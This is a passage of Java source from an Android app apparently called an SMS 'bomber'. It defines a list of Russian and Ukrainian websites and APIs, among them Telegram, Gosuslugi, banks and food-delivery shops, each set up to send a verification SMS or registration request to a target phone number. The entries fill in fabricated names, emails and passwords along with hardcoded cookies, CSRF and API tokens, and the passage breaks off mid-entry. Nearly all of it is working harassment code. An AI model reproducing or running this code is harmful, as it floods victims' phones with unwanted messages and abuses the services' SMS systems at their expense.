package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.Headers;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ServicesRepository implements Repository {

    public final static Service[] services = new Service[]{

            new JsonService("https://kent.ru/api/send-confirm?qr=", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "PHPSESSID=HPzGVlI2661lyYYGpYwSRE5gYH4AN29l; _ym_uid=16707808381020170675; _ym_d=1670780838; _ga=GA1.2.503857613.1670780838; _gid=GA1.2.2103368223.1670780838; _ym_visorc=w; _ym_isad=2; session=/welcome/; verify=1");

                    try {
                        return new JSONObject()
                                .put("case", "register")
                                .put("contact", phone.toString())
                                .put("type", "sms")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://tv.yota.ru/")
                            .get().build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("msisdn", phone.toString());
                                json.put("password", "91234657");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            StringBuilder cookie = new StringBuilder();

                            for (String entry : response.headers("Set-Cookie")) {
                                cookie.append(entry.split(";")[0]);
                                cookie.append("; ");
                            }

                            try {
                                client.newCall(new Request.Builder()
                                        .url("https://bmp.tv.yota.ru/api/v10/auth/register/msisdn")
                                        .addHeader("Cookie", cookie.toString())
                                        .post(RequestBody.create(
                                                json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);
                            } catch (NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new JsonService("https://www.gosuslugi.ru/auth-provider/mobile/register", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("instanceId", "123");
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("contactType", "mobile");
                        json.put("contactValue", format(phone.getPhone(), "+7(***)*******"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://my.telegram.org/auth/send_password") {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", "+" + phone.toString());
                }
            },

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", phone.toString());
                }
            },


            new JsonService("https://api.sunlight.net/v3/customers/authorization/", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.headers(new Headers.Builder()
                            .add("X-Requested-With", "SunlightFrontendApp")
                            .addUnsafeNonAscii("Cookie", "city_auto_popup_shown=1; city_id=305; city_name=Муром; city_full_name=Меленки, Владимирская обл; region_id=a2abfdde-54eb-43c0-981c-644657238a3c; region_name=Муром; region_subdomain=\"\"; ccart=off; session_id=1b7ddd46-ee43-443f-9faa-b0274689f4ab; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; _ga=GA1.2.1099609403.1670778978; _gid=GA1.2.1444923732.1670778978; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; _tt_enable_cookie=1; _ttp=a3a48ff1-8e5d-407d-8995-dc4e7ca99913; _ym_uid=1659884110990105023; _ym_d=1670778978; _ym_isad=2; _ym_visorc=b; popmechanic_sbjs_migrations=popmechanic_1418474375998=1|||1471519752600=1|||1471519752605=1; _ga_HJNSJ6NG5J=GS1.1.1670778977.1.0.1670778980.57.0.0; auid=1196ce38-5136-4290-bf14-e29d02d50fa7:1p4Pw3:gOobko9I_s6h9Ng8IWQXyNN-TejCW4-SO1-lN7_LLjQ; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session={\"deviceGuid\":\"bb0643e8-bc08-4838-bf34-5b23a4221287\"}")
                            .build());

                    try {
                        return new JSONObject()
                                .put("phone", phone)
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new Service(380) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("msisdn", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://mnp.lifecell.ua/mnp/get-token/")
                            .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            try {
                                JSONObject req = new JSONObject(Objects.requireNonNull(response.body()).string());

                                JSONObject json = new JSONObject();
                                json.put("contact", phone.toString());
                                json.put("otp_type", "standart");

                                client.newCall(new Request.Builder()
                                        .url("https://mnp.lifecell.ua/mnp/otp/send/")
                                        .header("authorization", "Token " + req.getString("token"))
                                        .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                        .build()).enqueue(callback);

                            } catch (JSONException | NullPointerException e) {
                                callback.onError(call, e);
                            }
                        }
                    });
                }
            },

            new FormService("https://uss.rozetka.com.ua/session/auth/signup-phone", 380) {
                @Override
                public void buildBody(Phone phone) {
                    String name = getRussianName();

                    builder.add("title", name);
                    builder.add("first_name", name);
                    builder.add("last_name", getRussianName());
                    builder.add("password", getUserName() + "A123");
                    builder.add("email", getEmail());
                    builder.add("phone", phone.getPhone());
                    builder.add("request_token", "rB4eDGHMb00wHeQls7l4Ag==");

                    request.addHeader("Cookie", "ab-cart-se=new; xab_segment=123; slang=ru; uid=rB4eDGHMb00wHeQls7l4Ag==; visitor_city=1; _uss-csrf=zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5; ussat_exp=1640830991; ussat=8201437cececef15030d16966efa914d.ua-a559ca63edf16a11f148038356f6ac94.1640830991; ussrt=6527028eb43574da97a51f66ef50c5d0.ua-a559ca63edf16a11f148038356f6ac94.1643379791; ussapp=u3-u_ZIf2pBPN8Y6oGYIQZLBN4LUkQgplA_Dy2IX; uss_evoid_cascade=no");
                    request.addHeader("Csrf-Token", "zfILVt2Lk9ea1KoFpg6LVnxCivNV1mff+ZDbpC0kSK9c/K/5");
                }
            },

            new FormService("https://happywear.ru/index.php?route=module/registerformbox/ajaxCheckEmail", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("email", getEmail());
                    builder.add("telephone", format(phone.getPhone(), "7(***)***-**-**"));
                    builder.add("password", "qVVwa6QwcaCPP2s");
                    builder.add("confirm", "qVVwa6QwcaCPP2s");
                }
            },

            new ParamsService("https://www.sportmaster.ua/?module=users&action=SendSMSReg", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new FormService("https://yaro.ua/assets/components/office/action.php", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("action", "authcustom/formRegister");
                    builder.add("mobilephone", phone.toString());
                    builder.add("pageId", "116");
                    builder.add("csrf", "b1618ecce3d6e49833f9d9c8c93f9c53");
                }
            },

            new JsonService("https://api.01.hungrygator.ru/web/auth/webotp", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("userLogin", format(phone.getPhone(), "+7 (***) ***-**-**"));
                        json.put("fu", "bar");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://sushiicons.com.ua/kiev/index.php?route=common/cart/ajaxgetcoderegister", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("firstname", getRussianName());
                    builder.add("phone", format(phone.getPhone(), "+380 (**) ***-**-**"));
                    builder.add("birthday", "2005-03-05");
                }
            },

            new JsonService("https://e-solution.pickpoint.ru/mobileapi/17100/sendsmscode") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("PhoneNumber", phone.toString());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.addHeader("User-Agent", "Application name: pickpoint_android, Android version: 29, Device model: Mi 9T Pro (raphael), App version name: 3.9.0, App version code: 69, App flavor: , Build type: release");
                    request.addHeader("Connection", "Keep-Alive");
                    request.addHeader("Accept-Encoding", "gzip");

                    return json.toString();
                }
            },

            new JsonService("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone.getPhone(), "+7 *** ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://c.ua/index.php?route=account/loginapples/sendSMS", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addQueryParameter("route", "account/loginapples/sendSMS");
                    builder.addQueryParameter("phone", "0" + phone);
                }
            },

            new ParamsService("https://my.hmara.tv/api/sign", 380) {
                @Override
                public void buildParams(Phone phone) {
                    builder.addEncodedQueryParameter("contact", phone.toString());
                    builder.addEncodedQueryParameter("deviceId", "81826091-f299-4515-b70f-e82fd00fec9a");
                    builder.addEncodedQueryParameter("language", "ru");
                    builder.addEncodedQueryParameter("profileId", "1");
                    builder.addEncodedQueryParameter("deviceType", "2");
                    builder.addEncodedQueryParameter("ver", "2.2.9");

                    request.header("Cookie", "_ga=GA1.2.641734216.1650994527; _gid=GA1.2.109748838.1650994527; _gat_gtag_UA_131143143_1=1; _fbp=fb.1.1650994527815.1351289375; _hjFirstSeen=1; _hjSession_1352224=eyJpZCI6IjQ4ZWY4YmFhLTBmZDMtNGE1Yy05NGNiLWUzNzUzMjY5YWI5ZiIsImNyZWF0ZWQiOjE2NTA5OTQ1MjgzNTIsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=0; _hjSessionUser_1352224=eyJpZCI6ImQwMjA0NjA2LWNjYWUtNTBmNi1hMmNjLTU5YzdhMDQ5MTQwNyIsImNyZWF0ZWQiOjE2NTA5OTQ1Mjc4NzEsImV4aXN0aW5nIjp0cnVlfQ==; _gat=1");
                }
            },

            new FormService("https://beerlogapizza.ru/ajax/global_ajax.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("character", "number");
                    builder.add("phone", phone.getPhone());
                    builder.add("code", "");
                    builder.add("session_id", "e6ab56c6c97b3a47cdee0f60705a8561");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://liski.skoro-pizza.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "b3cb999a-d3ad-11ec-84bd-d00d1849d38c")
                            .header("x-thapl-domain", "rossosh.skoro-pizza.ru")
                            .header("x-thapl-region-id", "5")
                            .post(RequestBody.create("------WebKitFormBoundaryMUU3NBWAJgnNsU1E\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryMUU3NBWAJgnNsU1E--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMUU3NBWAJgnNsU1E")))
                            .build()).enqueue(callback);
                }
            },


            new FormService("https://be.budusushi.ua/login", 380) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("LoginForm[username]", "0" + phone);
                }
            },

            new FormService("https://almazholding.ru/local/user1/sendcode.php") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("PHONE", phone.toString());
                    builder.add("ECAPTCHA", "undefined");

                    request.header("Cookie", "_ym_d=1648577093; _ym_uid=1648577093945352536; PHPSESSID=l8uZ53Njk3Fnh6Sx5k6Fap6hW2CxC42l; ALTASIB_SITETYPE=original; BITRIX_SM_ALMAZ_GUEST_ID=5540491; BITRIX_SM_ALMAZ_LAST_ADV=5_Y; BITRIX_SM_ALMAZ_ALTASIB_LAST_IP=185.100.26.203; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE=%7B%22ID%22%3A%222149%22%2C%22BLOCK_BEGIN%22%3A%223110344704%22%2C%22BLOCK_END%22%3A%223110345727%22%2C%22BLOCK_ADDR%22%3A%22185.100.24.0%20-%20185.100.27.255%22%2C%22COUNTRY_CODE%22%3A%22RU%22%2C%22CITY_ID%22%3A%222149%22%2C%22CITY_NAME%22%3A%22%D0%9C%D1%83%D1%80%D0%BE%D0%BC%22%2C%22REGION_NAME%22%3A%22%D0%92%D0%BB%D0%B0%D0%B4%D0%B8%D0%BC%D0%B8%D1%80%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%2C%22COUNTY_NAME%22%3A%22%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3%22%2C%22BREADTH_CITY%22%3A%2255.574291%22%2C%22LONGITUDE_CITY%22%3A%2242.05151%22%7D; BITRIX_SM_ALMAZ_SALE_UID=101692370; BITRIX_SM_ALMAZ_ALTASIB_GEOBASE_COUNTRY=%7B%22country%22%3A%22RU%22%7D; BITRIX_SM_ALMAZ_refer=https%3A%2F%2Fwww.google.com%2F; BITRIX_SM_ALMAZ_CURRENT_CURRENCY=RUB; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A23%2C%22EXPIRE%22%3A1656449940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.218161957.1656428115; _gat_gtag_UA_212738426_1=1; _ym_visorc=w; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _lhtm_u=62baf6a0c08c1de57308a35b; _lhtm_r=https%3A//www.google.com|60ec84b803dc9ecc5a9bc57a; lh_banner_closed=true; BITRIX_SM_ALMAZ_LAST_VISIT=28.06.2022%2017%3A55%3A42; _ga_EM9HX0LRBQ=GS1.1.1656428114.1.1.1656428143.0; BITRIX_SM_ALMAZ_window_width=983; _ga=GA1.2.274030319.1656428115; lh_widget_system_pages_counter=2");
                }
            },

            new JsonService("https://qlean.ru/widget-form/http/requestotp") {
                private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37";

                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("connection", 3);
                        json.put("csrfToken", "1a55c5d16d8059e75304cb02ddda566b7d2a96bd22cc92937ee5a894e6dfa734");
                        json.put("login", phone.toString());
                        json.put("send", 1);
                        json.put("userAgent", USER_AGENT);
                        json.put("userType", 1);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    request.header("User-Agent", USER_AGENT);

                    return json.toString();
                }
            },

            new JsonService("https://adengi.ru/rest/v1/registration/code/send") {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("email", getEmail());
                        json.put("firstName", getRussianName());
                        json.put("lastName", getRussianName());
                        json.put("middleName", getRussianName());
                        json.put("phone", phone.toString());
                        json.put("via", "sms");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://sberuslugi.ru/api/v1/user/secret", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone.getPhone(), "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://www.akbars.ru/api/PhoneConfirm/", 7) {
                @Override
                public String buildJson(Phone phone) {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", phone);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://bandeatos.ru/?MODE=AJAX", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("sessid", "404d33f8bac1c1aa4305e6af3ebffa8b");
                    builder.add("FORM_ID", "bx_1789522556_form");
                    builder.add("PHONE_NUMBER", "+" + phone.toString());
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://pizzaco.ru/api/user/generate-password")
                            .header("Cookie", "upkvartal-frontend=t466jslnqhsc8ffkaqlf65bnfg; _csrf-frontend=eca7110ac5f6820f172812ae76b93ea6f91976b5374d49b3e50823904e661505a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22MqdE5DQapqSuoKww3kzp22qKVRklmP2O%22%3B%7D; _ym_uid=1656577574308706185; _ym_d=1656577574; _ym_visorc=w; _ym_isad=2; advanced-api=cm1ium0dmmq1nbveiinjdiku16; api-key=4e661934-f84e-11ec-9a5c-d00d1849d38c; app-settings=%7B%22promo_text%22%3Anull%2C%22cart_suggest_header%22%3Anull%2C%22seo_info%22%3A%7B%22title%22%3A%22%D0%93%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F%22%2C%22description%22%3Anull%7D%2C%22auth_by_call%22%3Afalse%2C%22voice_call_auth%22%3Afalse%2C%22has_promo_advice%22%3Afalse%2C%22ask_address_on_first_enter%22%3Atrue%2C%22ask_address_on_add_to_cart%22%3Atrue%2C%22min_order_value%22%3A600%2C%22order_disable_card_for_weight%22%3Afalse%2C%22app_store_id%22%3A%22app%22%2C%22order_cart_to_courier%22%3Atrue%2C%22order_auth%22%3Afalse%2C%22takeaway_enabled%22%3Atrue%2C%22not_heat%22%3Afalse%2C%22default_persons_count%22%3A%221%22%2C%22order_to_time%22%3Afalse%2C%22show_not_call%22%3Afalse%2C%22order_show_persons%22%3Atrue%2C%22disable_order%22%3Afalse%2C%22default_phone%22%3A%22%2B7(812)220-01-02%22%2C%22auth_enabled%22%3Atrue%2C%22catalog_currency_symbol%22%3A%22%D0%A0%22%2C%22app_menu%22%3A%5B%7B%22id%22%3A10%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A11%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata-mobil%22%7D%7D%5D%2C%22footer_menu%22%3A%5B%7B%22id%22%3A1%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A2%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A8%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A9%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22mobile_menu%22%3A%5B%7B%22id%22%3A5%2C%22title%22%3A%22%D0%9C%D0%B5%D0%BD%D1%8E%22%7D%2C%7B%22id%22%3A3%2C%22title%22%3A%22%D0%9E%20%D0%BD%D0%B0%D1%81%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22o-nas%22%7D%7D%2C%7B%22id%22%3A4%2C%22title%22%3A%22%D0%9A%D0%BE%D0%BD%D1%82%D0%B0%D0%BA%D1%82%D1%8B%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22kontakty%22%7D%7D%2C%7B%22id%22%3A6%2C%22title%22%3A%22%D0%90%D0%BA%D1%86%D0%B8%D0%B8%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22akcii%22%7D%7D%2C%7B%22id%22%3A7%2C%22title%22%3A%22%D0%94%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BA%D0%B0%20%D0%B8%20%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B0%22%2C%22type%22%3A20%2C%22target_id%22%3A%7B%22slug%22%3A%22dostavka-i-oplata%22%7D%7D%5D%2C%22header_menu%22%3A%5B%5D%2C%22combine_promo_and_bonus%22%3Afalse%2C%22order_disable_cash%22%3Afalse%2C%22loyalty_program%22%3A%7B%22enabled%22%3Afalse%7D%2C%22whatsapp%22%3Anull%2C%22tg%22%3Anull%2C%22privacy_link%22%3Anull%2C%22promo_link%22%3A%22http%3A%2F%2Fabout.mnogolososya.ru%2Freceive_advertising%22%2C%22instagram%22%3Anull%2C%22vk%22%3Anull%2C%22facebook%22%3Anull%2C%22update_privacy%22%3Afalse%2C%22main_logo%22%3A%22https%3A%2F%2Fthapl-public.storage.yandexcloud.net%2F%2Fimg%2FSiteSetting%2F7eb85221f6c97c13f93532fffc1edc42_origin_.svg%22%2C%22additional_logo%22%3Anull%2C%22header_background%22%3A%22https%3A%2F%2Fstorage.yandexcloud.net%2Fthapl-public%2F%2Fimg%2FSiteSetting%2F74dff64b5b8cff080bc39a5678b2107d_origin.png%22%2C%22order_to_time_disable_holidays%22%3Atrue%2C%22order_to_time_min_gap_days%22%3A0%2C%22order_to_time_max_gap_days%22%3A2%2C%22start_up_promos%22%3A%5B%5D%2C%22check_region%22%3Afalse%7D")
                            .header("x-thapl-apitoken", "4e661934-f84e-11ec-9a5c-d00d1849d38c")
                            .post(RequestBody.create("------WebKitFormBoundaryMQ1naEW4T6mNqlQx\n" +
                                            "Content-Disposition: form-data; name=\"phone\"\n" +
                                            "\n" +
                                            format(phone.getPhone(), "+7 *** *** ** **\n") +
                                            "------WebKitFormBoundaryMQ1naEW4T6mNqlQx--",
                                    MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryMQ1naEW4T6mNqlQx")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://my.sravni.ru/signin/code") {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("__RequestVerificationToken", "CfDJ8CweUVAmnVJNqszqP15xx-hitFFEfBAUJnGvIZBqF4kqdB5DijYyQ1u0JbRmCq1dmVlRFqphQ6HElnEEqCPG4scR5SV47pVWqKe2anjUFfDfInYU_PqxRR-YmP-jRR5i9RjiExsOMk6554nFT1bXJDw");
                    builder.add("phone", "+" + phone.toString());
                    builder.add("returnUrl", "/connect/authorize/callback?client_id=www&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20reviews%20esia%20orders.r%20messagesender.sms%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.VZR.Service%20Sravni.Affiliates.Service%20Sravni.News.Service&amp;response_type=code%20id_token%20token&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fcallback%2F&amp;response_mode=form_post&amp;state=aKMJO_u7seq0O8Z9swoMZNCxPQII1BQ3BXIcID0uDko&amp;nonce=GmzCt6zbp1YnZf9QHMmPR05NvwI3Cftm5or6YISMk0E&amp;login_hint&amp;acr_values");

                    request.header("Cookie", "_ym_uid=1648230902270232651; _ym_d=1652720791; .ASPXANONYMOUS=Wj7EH3nLFEqyHYYidQ77qw; _SL_=6.39.924.2529.; _ipl=6.39.924.2529.; __utmz=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); __utmx=utmccn%3d(not%20set)%7cutmcct%3d(not%20set)%7cutmcmd%3d(none)%7cutmcsr%3d(direct)%7cutmctr%3d(not%20set); AB_ACCIDENTINSURANCE=Test_000157_A; AB_ACCIDENTINSURANCE_DIRECT=never; AB_CREDITSELECTION=Test_000166_A; AB_CREDITSELECTION_DIRECT=never; _cfuvid=TKf4a7o.NTcTPY_jj3zbB16KROEpLGVqG0Imwqu3TEI-1656577933373-0-604800000; _ym_isad=2; __cf_bm=_M1xArnm.U77LAsOK_KlLRVFXulIg3HMgd..c9EiIY0-1656577934-0-AUVp6iX2Hs51aaQy+D9IHzsnLsF/EPMFijHTey8FTyQglJrrtTXU6dFRUj0vxr+RcG2AVwMko93NHqnHzk8Bz0g5PgqLJIdFv9rIikiW8R4PnhOLGnKUuDUbHL1/jAu1HnRMhV0JYn7iQgTltY9+qVjvFAYsGm7xArMGnX91PQXUkYOY18FgSDJ5n+/DoE5BpA==; _ga_WE262B3KPE=GS1.1.1656577934.1.0.1656577934.60; _ga=GA1.2.1897499837.1656577935; _gid=GA1.2.923198233.1656577935; _gat_UA-8755402-16=1; _dc_gtm_UA-8755402-14=1; _gcl_au=1.1.1765525680.1656577935; tmr_lvidTS=1648230904449; tmr_lvid=dbd59ad03175fd34d0f64f769fd0a5fd; uid=UbGokWK9X4+oKCNlCFuNAg==; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8CweUVAmnVJNqszqP15xx-gMzc_APgAJ9lv4roObOleM7Ox8t2-vnQIlIJ-wYm7CCo8pj8IaZcFjEXe4o6mBvTybEccN7O-Aq8i7Z0iM9kfA0CCpVx-xprNiLnoRfIiWEMAq86LRrU2g-JUQ3RkFE_o; tmr_reqNum=11");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback, Phone phone) {
                    client.newCall(new Request.Builder()
                            .url("https://food-port.ru/api/user/generate-password")
                            .header("x-thapl-apitoken", "0b84683a-14b6-11ed-9881-d00d1849d38c")
                            .header("x-thapl-domain", "kronshtadt.food-port.ru")
                            .header("x-thapl-region-id", "2")
                            .post(RequestBody.create("------WebKitFormBoundaryd1lHEip8CBDSaYZd\n" +
                                    "Content-Disposition: form-data; name=\"phone\"\n" +
                                    "\n" +
                                    format(phone.getPhone(), "+7 *** *** ** **") +
                                    "\n------WebKitFormBoundaryd1lHEip8CBDSaYZd--", MediaType.parse("multipart/form-data; boundary=----WebKitFormBoundaryd1lHEip8CBDSaYZd")))
                            .build()).enqueue(callback);
                }
            },

            new FormService("https://dobropizza.ru/ajaxopen/userregisterdobro", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("username", format(phone.getPhone(), "+7(***) ***-**-**"));
                    builder.add("sms", "0");
                    builder.add("cis", "57");
                }
            },

            new FormService("https://italiani.rest/local/templates/italini/PhoneAuth.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("phone", format(phone.getPhone(), "+7(***)***-**-**"));
                    builder.add("type", "sendauth");
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "rr-testCookie=testvalue; rrpvid=355622261348501; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; city_auto_popup_shown=1; rcuid=6275fcd65368be000135cd22; city_id=117; city_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; city_full_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_id=91eae2f5-b1d7-442f-bc86-c6c11c581fad; region_name=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; region_subdomain=\"\"; ccart=off; _ga_HJNSJ6NG5J=GS1.1.1659884102.1.1.1659884103.59; _gcl_au=1.1.506379343.1659884104; session_id=6e72af95-3f3f-4b9f-a6d6-a7d278592347; _ga=GA1.2.1345812504.1659884102; _gid=GA1.2.362170990.1659884104; _gat_test=1; _gat_UA-11277336-11=1; _gat_UA-11277336-12=1; _gat_owox=1; tmr_lvid=220061aaaf4f8e8ab3c3985fb53cb3f3; tmr_lvidTS=1659884104985; tmr_reqNum=2; _tt_enable_cookie=1; _ttp=07d211e3-9558-4957-95dd-496cafdd2431; _ym_uid=1659884110990105023; _ym_d=1659884110; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ym_isad=2; _ym_visorc=b");

                    try {
                        return new JSONObject()
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://bankiros.ru/send-code/verify") {
                @Override
                public void buildParams(Phone phone) {
